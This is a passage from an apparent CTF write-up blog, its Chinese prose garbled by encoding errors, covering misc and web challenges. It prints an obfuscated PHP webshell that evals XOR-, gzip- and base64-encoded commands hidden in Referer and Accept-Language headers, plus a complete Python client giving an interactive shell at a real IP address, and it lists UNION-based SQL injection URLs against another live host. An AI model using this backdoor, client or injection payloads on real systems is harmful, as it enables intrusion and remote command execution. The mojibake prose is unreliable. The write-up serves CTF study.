ï¼Œç›´æ¥å‡ºäº†ä¸€ä¸ªè§£å¯†ç½‘ç«™<code>https://www.unphp.net/</code>æŠŠä»£ç æ‹¿åˆ°è¿™ä¸ªç½‘ç«™è§£ä¸€ä¸‹<br><img src="/images/tjuctf/4.png" alt="image-20220124195541546"><br>åé¢ï¼Œæœåˆ°è¿™ä¸ªé©¬å­çŸ¥é“å±…ç„¶è¿˜å¯ä»¥ç›´æ¥è¾“å‡º<br><img src="/images/tjuctf/5.png" alt="image-20220124195909580"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$kh</span> = <span class="string">&quot;3481&quot;</span>;</span><br><span class="line"><span class="variable">$kf</span> = <span class="string">&quot;9d7b&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>, <span class="variable">$k</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$c</span> = strlen(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span> = strlen(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="variable">$l</span>;) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>;(<span class="variable">$j</span> &lt; <span class="variable">$c</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="variable">$l</span>);<span class="variable">$j</span>++, <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$o</span>.= <span class="variable">$t</span>&#123;<span class="variable">$i</span>&#125; ^ <span class="variable">$k</span>&#123;<span class="variable">$j</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$r</span> = <span class="variable">$_SERVER</span>;</span><br><span class="line"><span class="variable">$rr</span> = @<span class="variable">$r</span>[<span class="string">&quot;HTTP_REFERER&quot;</span>];</span><br><span class="line"><span class="variable">$ra</span> = @<span class="variable">$r</span>[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$rr</span> &amp;&amp; <span class="variable">$ra</span>) &#123;</span><br><span class="line">    <span class="variable">$u</span> = parse_url(<span class="variable">$rr</span>);</span><br><span class="line">    parse_str(<span class="variable">$u</span>[<span class="string">&quot;query&quot;</span>], <span class="variable">$q</span>);</span><br><span class="line">    <span class="variable">$q</span> = array_values(<span class="variable">$q</span>);</span><br><span class="line">    preg_match_all(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>, <span class="variable">$ra</span>, <span class="variable">$m</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$q</span> &amp;&amp; <span class="variable">$m</span>) &#123;</span><br><span class="line">        @session_start();</span><br><span class="line">        <span class="variable">$s</span> = &amp; <span class="variable">$_SESSION</span>;</span><br><span class="line">        <span class="variable">$ss</span> = <span class="string">&quot;substr&quot;</span>;</span><br><span class="line">        <span class="variable">$sl</span> = <span class="string">&quot;strtolower&quot;</span>;</span><br><span class="line">        <span class="variable">$i</span> = <span class="variable">$m</span>[<span class="number">1</span>][<span class="number">0</span>] . <span class="variable">$m</span>[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">        <span class="variable">$h</span> = <span class="variable">$sl</span>(<span class="variable">$ss</span>(md5(<span class="variable">$i</span> . <span class="variable">$kh</span>), <span class="number">0</span>, <span class="number">3</span>));</span><br><span class="line">        <span class="variable">$f</span> = <span class="variable">$sl</span>(<span class="variable">$ss</span>(md5(<span class="variable">$i</span> . <span class="variable">$kf</span>), <span class="number">0</span>, <span class="number">3</span>));</span><br><span class="line">        <span class="variable">$p</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$z</span> = <span class="number">1</span>;<span class="variable">$z</span> &lt; count(<span class="variable">$m</span>[<span class="number">1</span>]);<span class="variable">$z</span>++) <span class="variable">$p</span>.= <span class="variable">$q</span>[<span class="variable">$m</span>[<span class="number">2</span>][<span class="variable">$z</span>]];</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$p</span>, <span class="variable">$h</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="variable">$s</span>[<span class="variable">$i</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="variable">$p</span> = <span class="variable">$ss</span>(<span class="variable">$p</span>, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (array_key_exists(<span class="variable">$i</span>, <span class="variable">$s</span>)) &#123;</span><br><span class="line">            <span class="variable">$s</span>[<span class="variable">$i</span>].= <span class="variable">$p</span>;</span><br><span class="line">            <span class="variable">$e</span> = strpos(<span class="variable">$s</span>[<span class="variable">$i</span>], <span class="variable">$f</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="variable">$k</span> = <span class="variable">$kh</span> . <span class="variable">$kf</span>;</span><br><span class="line">                ob_start();</span><br><span class="line">                <span class="keyword">eval</span>(@gzuncompress(@x(base64_decode(preg_replace(<span class="keyword">array</span>(<span class="string">&quot;/_/&quot;</span>, <span class="string">&quot;/-/&quot;</span>), <span class="keyword">array</span>(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;+&quot;</span>), <span class="variable">$ss</span>(<span class="variable">$s</span>[<span class="variable">$i</span>], <span class="number">0</span>, <span class="variable">$e</span>))), <span class="variable">$k</span>)));</span><br><span class="line">                <span class="variable">$o</span> = ob_get_contents();</span><br><span class="line">                ob_end_clean();</span><br><span class="line">                <span class="variable">$d</span> = base64_encode(x(gzcompress(<span class="variable">$o</span>), <span class="variable">$k</span>));</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">&quot;&lt;<span class="subst">$k</span>&gt;<span class="subst">$d</span>&lt;/<span class="subst">$k</span>&gt;&quot;</span>);</span><br><span class="line">                @session_destroy();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é©¬å­è¿˜è‡­è¿˜é•¿ï¼Œç›´æ¥æœé©¬å­é‡Œå…³é”®ä»£ç ï¼Œ<code>https://www.jianshu.com/p/c8099299ac2a</code><br>å½“æ—¶çœ‹çš„ä¸æ˜¯è¿™ä¸ªå¸ˆå‚…çš„æ–‡ç« ï¼Œå½“æ—¶çš„æ‰¾ä¸åˆ°äº†ï¼Œéƒ½ä¸€æ ·ï¼Œpythonä¸€å»ºåˆ©ç”¨è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint, choice</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choicePart</span>(<span class="params">seq, amount</span>):</span></span><br><span class="line">    length = <span class="built_in">len</span>(seq)</span><br><span class="line">    <span class="keyword">if</span> length == <span class="number">0</span> <span class="keyword">or</span> length &lt; amount:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Error Input&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    result = []</span><br><span class="line">    indexes = []</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> count &lt; amount:</span><br><span class="line">        i = randint(<span class="number">0</span>, length - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> i <span class="keyword">in</span> indexes:</span><br><span class="line">            indexes.append(i)</span><br><span class="line">            result.append(seq[i])</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count == amount:</span><br><span class="line">                <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randBytesFlow</span>(<span class="params">amount</span>):</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(amount):</span><br><span class="line">        result += <span class="built_in">chr</span>(randint(<span class="number">0</span>, <span class="number">255</span>))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randAlpha</span>(<span class="params">amount</span>):</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(amount):</span><br><span class="line">        result += choice(string.ascii_letters)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loopXor</span>(<span class="params">text, key</span>):</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    lenKey = <span class="built_in">len</span>(key)</span><br><span class="line">    lenTxt = <span class="built_in">len</span>(text)</span><br><span class="line">    iTxt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> iTxt &lt; lenTxt:</span><br><span class="line">        iKey = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> iTxt &lt; lenTxt <span class="keyword">and</span> iKey &lt; lenKey:</span><br><span class="line">            result += <span class="built_in">chr</span>(<span class="built_in">ord</span>(key[iKey]) ^ <span class="built_in">ord</span>(text[iTxt]))</span><br><span class="line">            iTxt += <span class="number">1</span></span><br><span class="line">            iKey += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debugPrint</span>(<span class="params">msg</span>):</span></span><br><span class="line">    <span class="keyword">if</span> debugging:</span><br><span class="line">        <span class="built_in">print</span> msg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># config</span></span><br><span class="line">debugging = <span class="literal">False</span></span><br><span class="line">keyh = <span class="string">&quot;3481&quot;</span>  <span class="comment"># $kh</span></span><br><span class="line">keyf = <span class="string">&quot;9d7b&quot;</span>  <span class="comment"># $kf</span></span><br><span class="line">xorKey = keyh + keyf</span><br><span class="line">url = <span class="string">&#x27;http://42.192.64.28:8083/shell.php&#x27;</span></span><br><span class="line">defaultLang = <span class="string">&#x27;zh-CN&#x27;</span></span><br><span class="line">languages = [<span class="string">&#x27;zh-TW;q=0.%d&#x27;</span>, <span class="string">&#x27;zh-HK;q=0.%d&#x27;</span>, <span class="string">&#x27;en-US;q=0.%d&#x27;</span>, <span class="string">&#x27;en;q=0.%d&#x27;</span>]</span><br><span class="line">proxies = <span class="literal">None</span>  <span class="comment"># &#123;&#x27;http&#x27;:&#x27;http://127.0.0.1:8080&#x27;&#125; # proxy for debug</span></span><br><span class="line"></span><br><span class="line">sess = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate random Accept-Language only once each session</span></span><br><span class="line">langTmp = choicePart(languages, <span class="number">3</span>)</span><br><span class="line">indexes = <span class="built_in">sorted</span>(choicePart(<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>), <span class="number">3</span>), reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">acceptLang = [defaultLang]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">    acceptLang.append(langTmp[i] % (indexes[i],))</span><br><span class="line">acceptLangStr = <span class="string">&#x27;,&#x27;</span>.join(acceptLang)</span><br><span class="line">debugPrint(acceptLangStr)</span><br><span class="line"></span><br><span class="line">init2Char = acceptLang[<span class="number">0</span>][<span class="number">0</span>] + acceptLang[<span class="number">1</span>][<span class="number">0</span>]  <span class="comment"># $i</span></span><br><span class="line">md5head = (md5(init2Char + keyh).hexdigest())[<span class="number">0</span>:<span class="number">3</span>]</span><br><span class="line">md5tail = (md5(init2Char + keyf).hexdigest())[<span class="number">0</span>:<span class="number">3</span>] + randAlpha(randint(<span class="number">3</span>, <span class="number">8</span>))</span><br><span class="line">debugPrint(<span class="string">&#x27;$i is %s&#x27;</span> % (init2Char))</span><br><span class="line">debugPrint(<span class="string">&#x27;md5 head: %s&#x27;</span> % (md5head,))</span><br><span class="line">debugPrint(<span class="string">&#x27;md5 tail: %s&#x27;</span> % (md5tail,))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Interactive php shell</span></span><br><span class="line">cmd = raw_input(<span class="string">&#x27;phpshell &gt; &#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> cmd != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">    <span class="comment"># build junk data in referer</span></span><br><span class="line">    query = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">max</span>(indexes) + <span class="number">1</span> + randint(<span class="number">0</span>, <span class="number">2</span>)):</span><br><span class="line">        key = randAlpha(randint(<span class="number">3</span>, <span class="number">6</span>))</span><br><span class="line">        value = base64.urlsafe_b64encode(randBytesFlow(randint(<span class="number">3</span>, <span class="number">12</span>)))</span><br><span class="line">        query.append((key, value))</span><br><span class="line">    debugPrint(<span class="string">&#x27;Before insert payload:&#x27;</span>)</span><br><span class="line">    debugPrint(query)</span><br><span class="line">    debugPrint(urllib.urlencode(query))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># encode payload</span></span><br><span class="line">    payload = zlib.compress(cmd)</span><br><span class="line">    payload = loopXor(payload, xorKey)</span><br><span class="line">    payload = base64.urlsafe_b64encode(payload)</span><br><span class="line">    payload = md5head + payload</span><br><span class="line"></span><br><span class="line">    <span class="comment"># cut payload, replace into referer</span></span><br><span class="line">    cutIndex = randint(<span class="number">2</span>, <span class="built_in">len</span>(payload) - <span class="number">3</span>)</span><br><span class="line">    payloadPieces = (payload[<span class="number">0</span>:cutIndex], payload[cutIndex:], md5tail)</span><br><span class="line">    iPiece = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> indexes:</span><br><span class="line">        query[i] = (query[i][<span class="number">0</span>], payloadPieces[iPiece])</span><br><span class="line">        iPiece += <span class="number">1</span></span><br><span class="line">    referer = url + <span class="string">&#x27;?&#x27;</span> + urllib.urlencode(query)</span><br><span class="line">    debugPrint(<span class="string">&#x27;After insert payload, referer is:&#x27;</span>)</span><br><span class="line">    debugPrint(query)</span><br><span class="line">    debugPrint(referer)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># send request</span></span><br><span class="line">    r = sess.get(url, headers=&#123;<span class="string">&#x27;Accept-Language&#x27;</span>: acceptLangStr, <span class="string">&#x27;Referer&#x27;</span>: refe                                                                                   rer&#125;, proxies=proxies)</span><br><span class="line">    html = r.text</span><br><span class="line">    debugPrint(html)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># process response</span></span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;%s&gt;(.*)&lt;/%s&gt;&#x27;</span> % (xorKey, xorKey))</span><br><span class="line">    output = pattern.findall(html)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(output) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Error,  no backdoor response&#x27;</span></span><br><span class="line">        cmd = raw_input(<span class="string">&#x27;phpshell &gt; &#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    output = output[<span class="number">0</span>]</span><br><span class="line">    debugPrint(output)</span><br><span class="line">    output = output.decode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line">    output = loopXor(output, xorKey)</span><br><span class="line">    output = zlib.decompress(output)</span><br><span class="line">    <span class="built_in">print</span> output</span><br><span class="line">    cmd = raw_input(<span class="string">&#x27;phpshell &gt; &#x27;</span>)</span><br></pre></td></tr></table></figure><p>æ”¹æ‰ä¸­é—´çš„urlå’Œkeyå°±å¯ä»¥äº†ï¼Œpy2çš„<br><img src="/images/tjuctf/6.png" alt="image-20220124201741117"><br>ç›´æ¥æ‰“å°±è¡Œäº†ï¼Œå…·ä½“åŸå› å˜›ï¼Œè¿˜éœ€è¦ç»§ç»­ç ”ç©¶ç ”ç©¶</p><h5 id="è¿™ä¸ªdocä¸å¯¹åŠ²"><a href="#è¿™ä¸ªdocä¸å¯¹åŠ²" class="headerlink" title="è¿™ä¸ªdocä¸å¯¹åŠ²"></a>è¿™ä¸ªdocä¸å¯¹åŠ²</h5><p>è¿™ä¸ªé¢˜å¥½ç©ï¼Œæ¯”è¾ƒæœ‰è¶£ï¼Œä½†æ˜¯ä¸­é—´å‡ºç°äº†ä¸€äº›æ„å¤–ï¼Œä¸è¿‡æ— ä¼¤å¤§é›…<br>ä¸‹è½½é™„ä»¶ï¼Œæ˜¯ä¸ªdocï¼Œæ˜¾ç„¶60M+çš„docä¸å¤ªç°å®ï¼Œç›´æ¥æ”¹æˆzipåŒ…<br>æœ‰ä¸€ä¸ªkey.txtï¼Œé¢„è§ˆçœ‹ä¸å¤ªæ­£å¸¸ï¼Œå¯èƒ½æ˜¯0å®½ï¼Œç½‘ç«™æ‰“ä¸€ä¸‹<br><img src="/images/tjuctf/7.png" alt="image-20220124202818555"><br>åˆšå¼€å§‹ä»¥ä¸ºè¦æ©ç çˆ†ç ´ï¼Œä½†æ˜¯æ²¡è·‘å‡ºæ¥ï¼Œé—®äº†ä¸‹å‡ºé¢˜äººï¼Œé¢˜æœ‰äº›é—®é¢˜ï¼Œç›´æ¥ç»™å¯†ç äº†è§£ä¸€ä¸‹å‹ç¼©åŒ…<br><code>Because I like naruto best</code><br>è§£ä¸€ä¸‹å‹ç¼©åŒ…ï¼Œå¯ä»¥çœ‹åˆ°æœ‰è®¸å¤šå›¾ç‰‡ï¼Œä¸€å…±129488å¼ ï¼Œçœ‹å°å›¾ç‰‡æ˜¯ä¸¤ç§ä¸ä¸€æ ·çš„å›¾ç‰‡ï¼Œç›²çŒœè½¬01ï¼Œå…«ä¸ªä¸ºä¸€ä½ï¼Œè½¬asciiè½¬å‡ºæ¥å°±å¯ä»¥äº†ï¼Œäººå·¥è‚¯å®šä¸ç°å®ï¼Œè´´ä¸€ä¸‹è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># a = 104329</span></span><br><span class="line"><span class="comment"># for i in range(300,400):</span></span><br><span class="line"><span class="comment">#     if int(i)*int(i)==a:</span></span><br><span class="line"><span class="comment">#         print(i)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> asyncore <span class="keyword">import</span> write</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">fi = <span class="built_in">open</span>(<span class="string">&#x27;D:\\vscodework\\ctf\\tj\\tjtest.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">130000</span>):</span><br><span class="line">    <span class="comment">#å…«ä¸ªä¸ºä¸€ç»„å…«ä¸ªåè¾“å‡ºå›è½¦</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(i)%<span class="number">8</span>==<span class="number">0</span>:</span><br><span class="line">        fi.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="comment">#è¯»å–æ‰€æœ‰æ–‡ä»¶å¤¹ä¸‹å›¾ç‰‡ï¼Œæ ¹æ®getsizeåˆ¤æ–­</span></span><br><span class="line">    a=os.path.getsize(<span class="string">&#x27;C:\\Users\\xin\\Desktop\\love\\out\\&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;.png&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">262</span>:</span><br><span class="line">        fi.write(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">0</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">1</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        fi.write(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">fi.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\vscodework\\ctf\\tj\\tjtest.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        i = i.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(i, <span class="number">2</span>)),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯getsizeæ˜¯åˆ¤æ–­å›¾ç‰‡çš„å­—èŠ‚<br><img src="/images/tjuctf/8.png" alt="image-20220124203834234"><br>è¿è¡Œå‡ºæ¥ï¼Œæ˜¯base64å›¾ç‰‡ï¼Œç›´æ¥å¤åˆ¶åˆ°æµè§ˆå™¨å°±å¥½äº†<br><img src="/images/tjuctf/9.png" alt="image-20220124204133045"><br><img src="/images/tjuctf/10.png" alt="image-20220125181954185"><br>è¾“å‡ºçš„ä¸œè¥¿ç›´æ¥æ”¾åˆ°æµè§ˆå™¨è¿è¡Œå°±å¯ä»¥äº†</p><h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h5 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h5><p>sqlæ³¨å…¥æ²¡æœ‰ä»»ä½•è¿‡æ»¤,ç›´æ¥æ‰“å°±å¯ä»¥äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://123.56.40.11/sql.php?id=-1 union select version(),group_concat(schema_name),version(),version() from information_schema.schemata-- -</span><br><span class="line">http://123.56.40.11/sql.php?id=-1 union select version(),group_concat(table_name),version(),version() from information_schema.tables where table_schema=&#x27;CTF&#x27;-- -</span><br><span class="line">http://123.56.40.11/sql.php?id=-1 union select version(),group_concat(column_name),version(),version() from information_schema.columns where table_schema=&#x27;CTF&#x27; and table_name=&#x27;flag&#x27;-- -</span><br><span class="line">http://123.56.40.11/sql.php?id=-1 union select version(),flag,null,null from CTF.flag-- -</span><br></pre></td></tr></table></figure><h5 id="upload-bypass"><a href="#upload-bypass" class="headerlink" title="upload bypass"></a>upload bypass</h5><p>æ–‡ä»¶ä¸Šä¼ ï¼Œå‰ç«¯æ£€æµ‹ï¼Œå…ˆä¸Šä¼ ä¸€ä¸ªpngå›¾ç‰‡æŠ“åŒ…ï¼Œç„¶åæ”¹åç¼€ï¼Œcat  /flagå³å¯<br><img src="/images/tjuctf/11.png" alt="image-20220125194611835"></p><h5 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h5><p>ctfshowååºåˆ—åŒ–åŸé¢˜</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> ctfShowUser();</span><br><span class="line">    <span class="keyword">echo</span> serialize(<span 